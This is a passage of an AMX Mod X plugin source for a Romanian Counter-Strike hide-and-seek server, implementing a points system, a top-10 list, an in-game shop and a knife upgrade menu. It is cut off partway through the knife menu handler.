//	LAST EDIT ON >>>	05.04.2019 19:52

#pragma dynamic 32768

#include < amxmodx >
#include < amxmisc >
#include < cstrike >
#include < fakemeta >
#include <engine>
#include <fun>
#include < hamsandwich >

#define FVAULT
#if !defined FVAULT
#include < nvault >
new iVault
#else
#include < fvault >
new const g_VAULTNAME[] = "HnsPointsSystem";
#endif

#pragma tabsize 0


#define NEW_STYLE 1

#if NEW_STYLE == 1
new g_MenuX,arme1[33],arme2[33],arme3[33],respawn_on[33],accesari[33]

// my logs directory function
stock get_logsdir(output[], len) {
	return get_localinfo("amxx_logs", output, len);
}

//#define DEBUG

#define TASK_ID_REMOVE 14325

new gCaseSensitive;
#define IsCaseSensitive(%1)   (gCaseSensitive &   (1 << (%1 & 31)))
#define SetCaseSensitive(%1)   gCaseSensitive |=  (1 << (%1 & 31))
#define ClearCaseSensitive(%1) gCaseSensitive &= ~(1 << (%1 & 31))

// admin data stored
enum _:AdminData {
	Admin_Auth[44],
	Admin_Password[32],
	Admin_Access,
	Admin_Flags
};

// array holding admin data
new Array:gAdminData;
// auth key pointing to index of array
new Trie:gAuthIndex;
// size of array
new gNumAdmins;

// file where admins are loaded
new gAdminFile[125];

// kick command
new gKickCommand[125];
new bool:ea[33]=false

#if defined DEBUG
new gLogFile[65];

#define DebugLog(%1) log_to_file(gLogFile, %1)

new const gSeparator[] = "===========================================================";
#else
stock DebugLog(any:...) { }
stock gSeparator;
#endif
#else
new bool:respawn_on[33]=true
#endif


/*
const MAXPLAYERS = 32;
#define IsPlayer(%1)    (1<=%1<=MAXPLAYERS)*/

#define PLUGIN "HNS POINTS SYS"
#define VERSION "1.5x"


#define TASK_PTR	06091993


// |-- CC_ColorChat --|
enum Color
{
	NORMAL = 1, 		// Culoarea care o are jucatorul setata in cvar-ul scr_concolor.
	GREEN, 			// Culoare Verde.
	TEAM_COLOR, 		// Culoare Rosu, Albastru, Gri.
	GREY, 			// Culoarea Gri.
	RED, 			// Culoarea Rosu.
	BLUE, 			// Culoarea Albastru.
};

new TeamName[  ][  ] = 
{
	"",
	"TERRORIST",
	"CT",
	"SPECTATOR"
};
// |-- CC_ColorChat --|


new const g_szTag[ ] = "Hns#Points:";
/* Special Plugin Acces */
new const PluginSpecialAcces[ ][ ] =
{
	"eVoLuTiOn",
	"Triplu"
}

new g_szName[ 33 ][ 32 ],g_iUserCredits[ 33 ],iCredits,szFirstArg[ 32 ], szSecondArg[ 10 ],iPlayer,szArg[ 32 ];
new g_iCvarPTREnable,g_iCvarPTRMinutes,g_iCvarPTRCredits,g_iUserTime[ 33 ];
new g_iCvarEnable,g_iCvarKCredits,g_iCvarHECredits,g_iCvarKHCredits;



#define C_R1 150
#define C_R2 250
#define C_R3 350
#define C_R4 700
#define C_R5 2500
new const Prefix[][] =
{
"",//NU EDITA FMMMMMMMMMMMMMMM......
"Rank I",
"Rank II",
"Rank III",
"Rank IV",
"Rank V"
}
new Level[33],rounds
//new rounds2

#if NEW_STYLE!=1
new Menu,titlex[255]/*,menux[555]*/
new respawn_count1[33],respawn_count2[33],choosed1[33],choosed2[33],choosed3[33],choosed5[33],choosed4[33]

#define TITLE_RANKI "\rHNS\w .\y PLAY ARENA\w .\r RO\w -\y Shop\r Rank\y I"
#define TITLE_RANKII "\rHNS\w .\y PLAY ARENA\w .\r RO\w -\y Shop\r Rank\y II"
#define TITLE_RANKIII "\rHNS\w .\y PLAY ARENA\w .\r RO\w -\y Shop\r Rank\y III"
#define TITLE_RANKIV "\rHNS\w .\y PLAY ARENA\w .\r RO\w -\y Shop\r Rank\y IV"
#define TITLE_RANKV "\rHNS\w .\y PLAY ARENA\w .\r RO\w -\y Shop\r Rank\y V"



#define GOLD_AK "models/goldenhns/v_ak47.mdl"
new bool:gold_ak[33]
#endif

new bool:k1[33],bool:k2[33],bool:k3[33]

new text[512],spw[65],szPassword[35],g_Menu,bool:g_Password[33]=false,bool:have_speed[33],bool:have_gravity[33],roundsx=0

#if NEW_STYLE!=1
new bool:start_round_count[33]
#else
new start_round_count[33]
#endif



#define INFO_ZERO 0
#define NTOP 10
#define TIME 180.0

new toppoints[33]
new topnames[33][33]
new Data[64]


public plugin_init( )
{
	register_plugin( PLUGIN, VERSION, "Askhanar" );//edit by raiz0 for triplu
	
	register_clcmd( "say", "ClCmdSay" );
	register_clcmd( "say_team", "ClCmdSay" );
	
	register_clcmd( "puncte", "ClCmdCredits" );
	register_clcmd( "points", "ClCmdCredits" );
	
	register_clcmd( "amx_puncte", "ClCmdGiveCredits" );
	register_clcmd( "amx_takepuncte", "ClCmdTakeCredits" );
	
	RegisterHam( Ham_Spawn, "player", "ham_SpawnPlayerPost", true );
	//register_forward( FM_ClientUserInfoChanged, "Fwd_ClientUserInfoChanged" );


	g_iCvarPTREnable = register_cvar( "pt_enable", "1" );
	g_iCvarPTRMinutes = register_cvar( "pt_minutes", "60" );//60 minute = 1 ora
	g_iCvarPTRCredits = register_cvar( "pt_points", "50" );
	
	set_task( 1.0, "task_PTRFunction", TASK_PTR, _, _, "b", 0 );



	g_iCvarEnable = register_cvar( "pk_enable", "1" );
	g_iCvarKCredits = register_cvar( "pk_k_points", "15" );
	g_iCvarKHCredits = register_cvar( "pk_h_points", "30" );
	g_iCvarHECredits = register_cvar( "pk_he_points", "20" );
	
	register_event( "DeathMsg","ev_DeathMsg", "a")
	//RegisterHam(Ham_Killed, "player", "ev_DeathMsg",0);//1-after / 0-before
	//register_forward(FM_UpdateClientData, "fw_UpdateClientData_Post", 1)



	register_clcmd("ranks", "cmdRank")


#if NEW_STYLE !=1
	register_clcmd("amx_buy_vip", "buy_vip", ADMIN_USER, "<password>");
#endif

	register_clcmd( "say /shop", "ClCmdSaySHOP" );
	register_clcmd( "say_team /shop", "ClCmdSaySHOP" );
	
	register_event("HLTV", "event_new_round", "a", "1=0", "2=0")



   g_Menu = register_menuid("Knife Mod")
   register_menucmd(g_Menu, 1023, "knifemenu")
   
	register_clcmd( "say /knifepower", "ClCmdSayK" );
	register_clcmd( "say_team /knifepower", "ClCmdSayK" );
	register_clcmd( "say /knifes", "ClCmdSayK" );
	register_clcmd( "say_team /knifes", "ClCmdSayK" );
	register_clcmd( "say /knives", "ClCmdSayK" );
	register_clcmd( "say_team /knives", "ClCmdSayK" );

	register_clcmd("amx_buy_vipg1", "buy_vip_g1", ADMIN_USER, "<password>");

	RegisterHam( Ham_TakeDamage, "player", "Player_TakeDamage" );



#if NEW_STYLE == 1
   g_MenuX = register_menuid("Shop Mod")
   register_menucmd(g_MenuX, 1023, "shopmenu")

	if(!cvar_exists("amx_mode"))	register_cvar("amx_mode","1")
	if(!cvar_exists("amx_password_field"))	register_cvar("amx_password_field","_pw")
	if(!cvar_exists("amx_default_access"))	register_cvar("amx_default_access","z")


#if defined DEBUG
	// locate log file directory
	get_logsdir(gLogFile, charsmax(gLogFile));
	new l = add(gLogFile, charsmax(gLogFile), "/admin_custom");
	
	// check if log directory exists
	if(!dir_exists(gLogFile)) {
		// make directory
		mkdir(gLogFile);
	}
	
	// get the log file
	get_time("/%Y-%m-%d.log", gLogFile[l], charsmax(gLogFile) - l);
#endif
	
	// register kick command
	formatex(gKickCommand, charsmax(gKickCommand), "amxauthcustom%c%c%c%c", random_num('A', 'Z'), random_num('A', 'Z'), random_num('A', 'Z'), random_num('A', 'Z'));
	register_concmd(gKickCommand, "CmdKick");
	
	// locate admin file
	get_configsdir(gAdminFile, charsmax(gAdminFile));
	add(gAdminFile, charsmax(gAdminFile), "/users_custom.ini");
	
	// create array and trie
	gAdminData = ArrayCreate(AdminData);
	gAuthIndex = TrieCreate();
	
	// load admins
	LoadAdmins();
	
	// grab current time
	new hour, minute, second;
	time(hour, minute, second);
	
	// subtract current time from day length to get time left for today
	// add 5 seconds into the next day to be sure the day changed
	new timeLeft = 86400 - (hour * 3600) - (minute * 60) - second + 5;
	
	// set task to refresh admins when tomorrow starts for expiration checking and day checking
	set_task(float(timeLeft), "TaskRefreshAdmins");
#endif


	//register_clcmd( "transfer", "ClCmdFcsDonate" );


	register_clcmd( "say /toppuncte", "TopPuncte" );
	register_clcmd( "say_team /toppuncte", "TopPuncte" );

	get_datadir(Data, 63);
	read_top();


	register_cvar("last_shop","1")
}


#if NEW_STYLE !=1
public plugin_precache()	precache_model(GOLD_AK)
#endif



public RefreshTime(id) {
	checkandupdatetop(id,g_iUserCredits[id]);
	return PLUGIN_HANDLED;
}
public checkandupdatetop(id, points) {
read_top()
	for (new i = INFO_ZERO; i < NTOP; i++)
	{
		if( points > toppoints[i])
		{
			new pos = i;	
			while( !equal(topnames[pos],g_szName[id]) && pos < NTOP )
			{
				pos++;
			}
			
			for (new j = pos; j > i; j--)
			{
				formatex(topnames[j], 31, topnames[j-1]);
				toppoints[j] = toppoints[j-1];
			}
			formatex(topnames[i], 31, g_szName[id]);
			toppoints[i]=points;
			ColorChat(0, BLUE,"^x04%s^x03 %s^x01 este pe locul^x04 %d^x01 in top puncte cu^x03 %d^x01 punct%s", g_szTag, g_szName[id],(i+1),points,points == 1 ? "" : "e");
			save_top();
			break;
		}
		else if( equal(topnames[i], g_szName[id])) 
		break;	
	}
}
public save_top() {
	new path[128];
	formatex(path, 127, "%s/TopPuncte.dat", Data);
	if( file_exists(path) ) {
		delete_file(path);
	}
	new Buffer[256];
	new f = fopen(path, "at");
	for(new i = INFO_ZERO; i < NTOP; i++)
	{
		formatex(Buffer, 255, "^"%s^" ^"%d^"^n",topnames[i],toppoints[i] );
		fputs(f, Buffer);
	}
	fclose(f);
}
public read_top() {
	new Buffer[256],path[128];
	formatex(path, 127, "%s/TopPuncte.dat", Data);
	
	new f = fopen(path, "rt" );
	new i = INFO_ZERO;
	while( !feof(f) && i < NTOP+1)
	{
		fgets(f, Buffer, 255);
		new points[25]
		parse(Buffer, topnames[i], 31, points, 25);
		toppoints[i]= str_to_num(points);
		
		i++;
	}
	fclose(f);
}
public TopPuncte(id)
{	
	static buffer[2368], len, i,name[131]
	len = format(buffer[len], 2367-len,"<html><head><meta charset=UTF-8><STYLE>body{background:#232323;color:#cfcbc2;font-family:sans-serif}table{border-style:solid;border-width:1px;border-color:#FFFFFF;font-size:13px}</STYLE></head><body><table align=center width=100%% cellpadding=2 cellspacing=0>");
	len += format(buffer[len], 2367-len, "<tr align=center bgcolor=#52697B><th width=4%% > Nume: <th width=24%%> Puncte:");

	for(i = INFO_ZERO; i < NTOP; i++ ) {
			if( toppoints[i] == 0) {
				len += format(buffer[len], 2367-len, "<tr align=center bgcolor=#232323><td> %s <td> %s", "-", "-");
				i = NTOP
			}
			else {
				name = topnames[i];
				while( containi(name, "<") != -1 )	replace(name, 129, "<", "&lt;");
				while( containi(name, ">") != -1 )	replace(name, 129, ">", "&gt;");

				if(equal(topnames[i],g_szName[id]))	len += format(buffer[len], 2367-len, "<tr align=center bgcolor=#2D2D2D> <td> [ %s ] <td> [ %d ]", name,toppoints[i]);
				else	len += format(buffer[len], 2367-len, "<tr align=center bgcolor=#232323> <td> [ %s ] <td> [ %d ]", name,toppoints[i]);
			}
	}

	len += format(buffer[len], 2367-len, "</table>");
	len += formatex(buffer[len], 2367-len, "<tr align=bottom font-size:11px><Center><br><br>Primii %d Jucatori Cu Cele Mai Multe Puncte Acumulate</Center></tr></body>",NTOP);

	static strin[125];
	format(strin,124, "Top %d jucatori cu multe puncte",NTOP);
	show_motd(id, buffer, strin);
}


public ClCmdSay( id )
{
	static szArgs[192],arg1[32], arg2[32], arg3[6]
	read_args( szArgs, sizeof ( szArgs ) -1 );
remove_quotes( szArgs );
   arg1[0] = '^0'; 
   arg2[0] = '^0';
   arg3[0] = '^0';
   parse(szArgs, arg1, sizeof(arg1)-1, arg2, sizeof(arg2)-1, arg3, sizeof(arg3)-1); 
	
	if( !szArgs[ 0 ] )
		return PLUGIN_CONTINUE;
	
	new szCommand[ 15 ];
	
	if( equal( szArgs, "/puncte", strlen( "/puncte" ) )
		|| equal( szArgs, "/points", strlen( "/points" ) ) )
	{
		replace( szArgs, sizeof ( szArgs ) -1, "/", "" );
		formatex( szCommand, sizeof ( szCommand ) -1, szArgs );
		client_cmd( id, szCommand );
		return PLUGIN_HANDLED;
	}

	if( equal( szArgs, "/ranks", strlen( "/ranks" ) ) )
	{
		replace( szArgs, sizeof ( szArgs ) -1, "/", "" );
		formatex( szCommand, sizeof ( szCommand ) -1, szArgs );
		client_cmd( id, szCommand );
		return PLUGIN_HANDLED;
	}



	/*if( equal( arg1, "/transfer") )
	{
		ClCmdFcsDonate(id,arg2,arg3)
		return 1;
}*/

	return PLUGIN_CONTINUE;
}


stock ClCmdFcsDonate( id, target[], amnt[] )
{
	if( equal(amnt,"") )
	{
		ColorChat( id, NORMAL, "^x04%s^x01 Folosire:^x03 /transfer^x01 <^x04 nume^x01 > <^x03 punct(e)^x01 >", g_szTag );
		return 1;
	}

new temp = str_to_num(amnt);

	if( temp <= 0 )
	{
		ColorChat( id, NORMAL, "^x04%s^x01 Trebuie sa introduci o valoare mai mare de^x03 1P", g_szTag );
		return PLUGIN_HANDLED;
	}

	if( temp >100 )
	{
		ColorChat( id, NORMAL, "^x04%s^x01 Trebuie sa introduci o valoare mai mica de^x03 100P", g_szTag );
		return PLUGIN_HANDLED;
	}

	if( g_iUserCredits[ id ] < temp )
	{
		ColorChat( id, NORMAL, "^x04%s^x01 Nu ai destule punct%s, ai doar^x03 %i^x01 punct%s", g_szTag,g_iUserCredits[ id ] == 1 ? "" : "e", g_iUserCredits[ id ], g_iUserCredits[ id ] == 1 ? "" : "e" );
		return 1;
	}

	iPlayer = cmd_target( id, target, 8 );
	if( !iPlayer || !is_user_connected( iPlayer ) )
	{
		ColorChat( id, NORMAL, "^x04%s^x01 Acel jucator nu a fost gasit", g_szTag );
		return PLUGIN_HANDLED;
	}

	if( iPlayer == id )
	{
		ColorChat( id,  NORMAL, "^x04%s^x01 Nu-ti poti transfera puncte", g_szTag );
		return PLUGIN_HANDLED;
	}

	g_iUserCredits[ id ] -= temp;
	g_iUserCredits[ iPlayer ] += temp;

	SaveCredits( id );
	SaveCredits( iPlayer );

	new szFirstName[ 32 ], szSecondName[ 32 ];
	get_user_name( id, szFirstName, sizeof ( szFirstName ) -1 );
	get_user_name( iPlayer, szSecondName, sizeof ( szSecondName ) -1 );

	ColorChat( 0, NORMAL, "^x04%s^x01 Jucatorul^x03 %s^x01 i-a transferat^x04 %i^x01 punct%s lu^x03 %s", g_szTag, szFirstName, temp, temp == 1 ? "" : "e", szSecondName );

	return PLUGIN_HANDLED;
}


public event_new_round()
{
	for(new id=0;id<get_maxplayers();++id)
	{
#if NEW_STYLE!=1
	if(start_round_count[id])
	{
#else
if(accesari[id]<2)	accesari[id]=0
		else if(accesari[id]!=0&&++roundsx>=1)
{
	accesari[id]=0
	roundsx=0
}
	if(start_round_count[id]==1||start_round_count[id]==2||start_round_count[id]==3||start_round_count[id]==4)
	{
rounds++
#endif

#if NEW_STYLE == 1
			if(respawn_on[id]>0)	respawn_on[id]--
			if(arme1[id]>0)	arme1[id]--
			if(arme2[id]>0)	arme2[id]--
			if(arme3[id]>0)	arme3[id]--
		if(rounds>=3)
		{
			if(respawn_on[id]<=0)
{
respawn_on[id]=0
start_round_count[id]=5
}
			if(arme1[id]<=0)
{
arme1[id]=0
start_round_count[id]=6
}
			if(arme2[id]<=0)
{
arme2[id]=0
start_round_count[id]=7
}
			if(arme3[id]<=0)
{
arme3[id]=0
start_round_count[id]=8
}

			rounds=0
		}
#else
		if(++rounds>=3)
		{
			start_round_count[id]=false
			respawn_on[id]=true

			/*if(respawn_count1[id]>=2)*/	respawn_count1[id]=0
			/*if(respawn_count2[id]>=3)*/	respawn_count2[id]=0

			rounds=0
		}
#endif

#if NEW_STYLE!=1
	//if(++rounds2>1)
	//{
		/*if(choosed1[id]>=4)*/	choosed1[id]=0
		/*if(choosed2[id]>=4)*/	choosed2[id]=0
		/*if(choosed3[id]>=4)*/	choosed3[id]=0
		/*if(choosed4[id]>=4)*/	choosed4[id]=0
		/*if(choosed5[id]>=4)*/	choosed5[id]=0
		//rounds2=0
	//}
#endif
#if NEW_STYLE!=1
}
#else
}
#endif
}
}


public ClCmdSaySHOP(id)
{
	if(cs_get_user_team(id)==CS_TEAM_SPECTATOR)
	{
		ColorChat(id, NORMAL, "^4%s^1 Trebuie sa fi inscris intr-o^3 Echipa^1 pentru a accesa^4 Shopul^1!",g_szTag)
		return PLUGIN_HANDLED
	}

if(accesari[id]==2)
{
		ColorChat(id, NORMAL, "^4%s^1 Ai accesat meniul de doua ori / Asteapta RUNDA VIITOARE !",g_szTag)
return PLUGIN_HANDLED
}

if(get_cvar_num("last_shop")==1)
{
	new iAliveTerorrists[ 32 ], iAliveTerorristsNum,iAliveCTs[ 32 ], iAliveCTsNum
	get_players( iAliveTerorrists, iAliveTerorristsNum, "ace", "TERRORIST" )
	get_players( iAliveCTs, iAliveCTsNum, "ace", "CT" )
	if( iAliveTerorristsNum <= 1 || iAliveCTsNum <= 1 )
	{
	ColorChat(id, NORMAL, "^4[HNS.PLAY-ARENA.RO]^3 SHOP menu^1 it'is^4 LAST BITCH^1 !")
	return PLUGIN_HANDLED
	}
}

#if NEW_STYLE == 1
   static menu[1048]
   new len = formatex( menu, charsmax(menu), "\r[HNS.PLAY-ARENA.RO]\y MENU SHOP HNS^n^n")

   len += formatex( menu[len], charsmax(menu) - len, "\y[1]\w 50HP+50AP+3$ Medic\r [ 100 puncte ]^n")
   len += formatex( menu[len], charsmax(menu) - len, "\y[2]\w Speed 350 15 Secunde\r [ 80 puncte ]^n")
   len += formatex( menu[len], charsmax(menu) - len, "\y[3]\w Invizil 15 Secunde\r [ 150 puncte ]^n")
   len += formatex( menu[len], charsmax(menu) - len, "\y[4]\w Gravity 400 40 Secunde\r [ 200 puncte ]^n")
   len += formatex( menu[len], charsmax(menu) - len, "\y[5]\w 1 Respawn\r [ 150 puncte ]^n")
   len += formatex( menu[len], charsmax(menu) - len, "\y[6]\w V.I.P System\r [ 5000 puncte ]\d [ 14 zile ]^n")
   len += formatex( menu[len], charsmax(menu) - len, "\y[7]\w USP 3GL + 2HE + 2SMK + 10 HP\r [ 350 puncte ]^n")
   len += formatex( menu[len], charsmax(menu) - len, "\y[8]\w AK47 5GL + 1HE + 1SMK \r[ 500 puncte ]^n")
   len += formatex( menu[len], charsmax(menu) - len, "\y[9]\w AWP 4GL + 2HE + 1SMK + 10HP + 3$Medic\r [ 800 puncte ]^n")

   len += formatex( menu[len], charsmax(menu) - len, "^n\w0.\r Iesire")
   
   new keys = ( 1<<0 | 1<<1 | 1<<2 |1<<3|1<<4|1<<5|1<<6|1<<7|1<<8| 1<<9 )

   show_menu(id, keys, menu, -1, "Shop Mod")
#else
	if(choosed1[id]>=4||choosed2[id]>=4||choosed3[id]>=4||choosed4[id]>=4||choosed5[id]>=4)
	{
		ColorChat(id, NORMAL, "^4[HNS]^1 Ai folosit meniul de^3 4^1 ori ! Asteapta pana^3 runda viitoare")
		return PLUGIN_HANDLED
	}
	
	CheckLevel(id)

/*
	if(Level[id] <= 1)	ranki_shop(id)
	if(Level[id] >= 2)	rankii_shop(id)
	if(Level[id] >= 3)	rankiii_shop(id)
	if(Level[id] >= 4)	rankiv_shop(id)
	if(Level[id] >= 5)	rankv_shop(id)
*/
//hard..next to switch
	if(g_iUserCredits[id] >= C_R1||g_iUserCredits[id] <= C_R1)	ranki_shop(id)
	if(g_iUserCredits[id] >=C_R2)	rankii_shop(id)
	if(g_iUserCredits[id] >=C_R3)	rankiii_shop(id)
	if(g_iUserCredits[id] >=C_R4)	rankiv_shop(id)
	if(g_iUserCredits[id] >=C_R5)	rankv_shop(id)
#endif

	return PLUGIN_CONTINUE
}
public shopmenu(id, key) {
	if(!is_user_alive(id)&&(key!=4||key!=5))	return PLUGIN_HANDLED
	switch(key)
	{
		case 0:
		{
			if(g_iUserCredits[id]<100)
			{
ColorChat(id, GREEN, "^4%s^1 Nu ai suficiente^3 Puncte^1.",g_szTag)
				return PLUGIN_HANDLED
}

			set_user_health(id,get_user_health(id)+50)
			set_user_armor(id,get_user_armor(id)+50)

			cs_set_user_money(id,cs_get_user_money(id)+3,1)

			g_iUserCredits[id]-=100

		ColorChat(id, NORMAL, "^4%s^1 Ai ales^3 50HP+50AP+3$ Medic^1 pentru^4 100P",g_szTag)

accesari[id]++
		}

		case 1:
		{
if(have_speed[id])	return PLUGIN_HANDLED
			if(g_iUserCredits[id]<80)
			{
ColorChat(id, GREEN, "^4%s^1 Nu ai suficiente^3 Puncte^1.",g_szTag)
				return PLUGIN_HANDLED
}

			set_user_maxspeed(id,350.0)
			set_task(15.0,"RemoveSPEED",id)
			have_speed[id]=true

			g_iUserCredits[id]-=80

		ColorChat(id, NORMAL, "^4%s^1 Ai ales^3 350 SPEED^1 timp de^4 15S^1 pentru^3 80P",g_szTag)

accesari[id]++
		}

		case 2:
		{
			if(g_iUserCredits[id]<150)
			{
ColorChat(id, GREEN, "^4%s^1 Nu ai suficiente^3 Puncte^1.",g_szTag)
				return PLUGIN_HANDLED
}

			set_user_rendering(id,kRenderFxNone,0,0,0,kRenderTransAlpha,13)
			set_task(15.0,"RemoveINVIS",id)

			g_iUserCredits[id]-=150

		ColorChat(id, NORMAL, "^4%s^1 Ai ales^3 80% Invizibilitate^1 timp de^4 15S^1 pentru^3 150P",g_szTag)

accesari[id]++
		}

		case 3:
		{
if(have_gravity[id])	return PLUGIN_HANDLED

			if(g_iUserCredits[id]<200)
			{
ColorChat(id, GREEN, "^4%s^1 Nu ai suficiente^3 Puncte^1.",g_szTag)
				return PLUGIN_HANDLED
}

set_user_gravity(id, 400.0/get_cvar_float("sv_gravity"))
set_task(40.0,"RemoveGRAV",id)
have_gravity[id]=true

			g_iUserCredits[id]-=200

		ColorChat(id, NORMAL, "^4%s^1 Ai ales^3 -400 GRAVITY^1 timp de^4 40S^1 pentru^3 200P",g_szTag)

accesari[id]++
		}

		case 4:
		{
if(is_user_alive(id))	return PLUGIN_HANDLED
			if(g_iUserCredits[id]<150)
			{
ColorChat(id, GREEN, "^4%s^1 Nu ai suficiente^3 Puncte^1.",g_szTag)
				return PLUGIN_HANDLED
}

if(respawn_on[id]>0)
{
ColorChat(id,NORMAL,"[HNS.PLAY-ARENA.RO] Ai cumparat deja Respawn! mai ai de asteptat %d rund%s pentru a cumpara iar.",respawn_on[id],respawn_on[id]==1?"a":"e")
return PLUGIN_HANDLED
}

ExecuteHam( Ham_CS_RoundRespawn, id );
respawn_on[id]=3
start_round_count[id]=1

			g_iUserCredits[id]-=150

		ColorChat(id, NORMAL, "^4%s^1 Ai ales^3 RESPAWN^1 pentru^4 150P",g_szTag)

accesari[id]++
		}

		case 5:
		{
			if(is_user_admin(id)/*get_user_flags(id)&read_flags("p")*/)
			{
				ColorChat(id, NORMAL, "^4%s^1 Ai deja^3 acces^1!",g_szTag)
				return PLUGIN_HANDLED
			}

			if(g_iUserCredits[id]<5000)
			{
ColorChat(id, GREEN, "^4%s^1 Nu ai suficiente^3 Puncte^1.",g_szTag)
				return PLUGIN_HANDLED
}

			g_Password[id] = true;

		ColorChat(id, NORMAL, "^4%s^1 Ai cumparat^3 VIP^1 pentru^4 5000P^1 timp de^3 14Zile",g_szTag)

			client_cmd(id, "messagemode amx_buy_vipg1");

                                 ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
                                 ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
                                 ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
                                 ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
                                 ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
                                 ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
                                 ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)

			g_iUserCredits[id]-=5000

accesari[id]++
		}

		case 6:
		{
			if(g_iUserCredits[id]<350)
			{
ColorChat(id, GREEN, "^4%s^1 Nu ai suficiente^3 Puncte^1.",g_szTag)
				return PLUGIN_HANDLED
}
if(arme1[id]>0)
{
ColorChat(id,NORMAL,"[HNS.PLAY-ARENA.RO] Ai cumparat deja USP 3GL + 2HE + 2SMK + 10HP! Mai ai de asteptat %d rund%s pentru a le cumpara iar.",arme1[id],
arme1[id]==1?"a":"e")
return PLUGIN_HANDLED
}

				give_item(id,"weapon_usp")
give_item(id,"weapon_hegrenade")
give_item(id,"weapon_hegrenade")
give_item(id,"weapon_smokegrenade")
give_item(id,"weapon_smokegrenade")

				static usp
				usp = fm_find_ent_by_owner(-1, "weapon_usp", id)
				if(is_valid_ent(usp))
{
cs_set_weapon_ammo(usp,3)
cs_set_user_bpammo(id,CSW_USP,0)
}

set_user_health(id,get_user_health(id)+10)

arme1[id]=3
start_round_count[id]=2

ColorChat(id,NORMAL,"[HNS.PLAY-ARENA.RO] Ai cumparat USP 3GL + 2HE + 2SMK + 10HP")

			g_iUserCredits[id]-=350

accesari[id]++
		}

		case 7:
		{
			if(g_iUserCredits[id]<500)
			{
ColorChat(id, GREEN, "^4%s^1 Nu ai suficiente^3 Puncte^1.",g_szTag)
				return PLUGIN_HANDLED
}
if(arme2[id]>0)
{
ColorChat(id,NORMAL,"[HNS.PLAY-ARENA.RO] Ai cumparat deja AK47 5GL + 1HE + 1SMK! Mai ai de asteptat %d rund%s pentru a cumpara iar.",arme2[id],arme2[id]==1?"a":"e")
return PLUGIN_HANDLED
}

				give_item(id,"weapon_ak47")
give_item(id,"weapon_hegrenade")
give_item(id,"weapon_smokegrenade")
				static ak47
				ak47 = fm_find_ent_by_owner(-1, "weapon_ak47", id)
				if(is_valid_ent(ak47))
{
cs_set_weapon_ammo(ak47,5)
cs_set_user_bpammo(id,CSW_AK47,0)
}
arme2[id]=3
start_round_count[id]=3

			g_iUserCredits[id]-=500

ColorChat(id,NORMAL,"[HNS.PLAY-ARENA.RO] Ai cumparat AK47 5GL + 1HE + 1SMK")

accesari[id]++
		}

		case 8:
		{
			if(g_iUserCredits[id]<800)
			{
ColorChat(id, GREEN, "^4%s^1 Nu ai suficiente^3 Puncte^1.",g_szTag)
				return PLUGIN_HANDLED
}

if(arme3[id]>0)
{
ColorChat(id,NORMAL,"[HNS.PLAY-ARENA.RO] Ai cumparat deja AWP 4GL + 2HE + 1SMK + 10HP + 3$Medic! Mai ai de asteptat %d rund%s",arme3[id],arme3[id]==1?"a":"e")
return PLUGIN_HANDLED
}

				give_item(id,"weapon_awp")
give_item(id,"weapon_hegrenade")
give_item(id,"weapon_hegrenade")
give_item(id,"weapon_smokegrenade")

				static awp
				awp = fm_find_ent_by_owner(-1, "weapon_awp", id)
				if(is_valid_ent(awp))
{
cs_set_weapon_ammo(awp,4)
cs_set_user_bpammo(id,CSW_AWP,0)
}

set_user_health(id,get_user_health(id)+10)

cs_set_user_money(id,cs_get_user_money(id)+3,1)

arme3[id]=3
start_round_count[id]=4

			g_iUserCredits[id]-=800

ColorChat(id,NORMAL,"[HNS.PLAY-ARENA.RO] Ai cumparat AWP 4GL + 2HE + 1SMK + 10HP + 3$Medic")

accesari[id]++
		}

		default: return PLUGIN_HANDLED
	}

	return PLUGIN_HANDLED
}




public ClCmdSayK(id)
{
   new menuBody[512]

   add(menuBody, charsmax(menuBody), "\w[\rHNS.PLAY-ARENA.RO\w -\r KNIFE SYSTEM\w]^n^n")
   add(menuBody, charsmax(menuBody), "\r(\w1\r)\w -\r Knife Level I\w [\r +10 DMG +5 speed\w ] [\r 5k/points\w ]^n")
   add(menuBody, charsmax(menuBody), "\r(\w2\r)\w -\r Knife Level II\w [\r +20 DMG +10 speed\w ] [\r 10k/points\w ]^n")
   add(menuBody, charsmax(menuBody), "\r(\w3\r)\w -\r Knife Level III\w [\r +30 DMG +20 speed\w ] [\r 30k/points\w ]^n^n")
   //add(menuBody, charsmax(menuBody), "\r(\w4\r)\w -\r V.I.P\w -\r G1\w [\r 50k/points\w ] [\r available\w ] [\r 3/weeks\w ]^n^n")
   add(menuBody, charsmax(menuBody), "\w0.\r Iesire")
   
   new keys = ( 1<<0 | 1<<1 | 1<<2 /*|1<<3*/| 1<<9 )
   show_menu(id, keys, menuBody, -1, "Knife Mod")
}
public knifemenu(id, key) {
	if(!is_user_alive(id))	return PLUGIN_HANDLED
	switch(key)
	{
		case 0:
		{
			if(g_iUserCredits[id]<5000)
			{
				ColorChat(id,NORMAL,"^3[HNS.PLAY-ARENA.RO]^1 Nu ai destule^3 puncte^1 pentru a cumpara acest^4 KNIFE^1 !")
				return PLUGIN_HANDLED
			}
			
			if(k1[id]||Level[id]<1)	return PLUGIN_HANDLED

			g_iUserCredits[id]-=5000
			k1[id]=true

			ColorChat(id,NORMAL,"^4[HNS.PLAY-ARENA.RO]^1 Ai cumparat:^4 Knife Level I")
		}

		case 1:
		{
			if(g_iUserCredits[id]<10000)
			{
				ColorChat(id,NORMAL,"^3[HNS.PLAY-ARENA.RO]^1 Nu ai destule^3 puncte^1 pentru a cumpara acest^4 KNIFE^1 !")
				return PLUGIN_HANDLED
			}
			
			if(k2[id]||Level[id]<2)	return PLUGIN_HANDLED

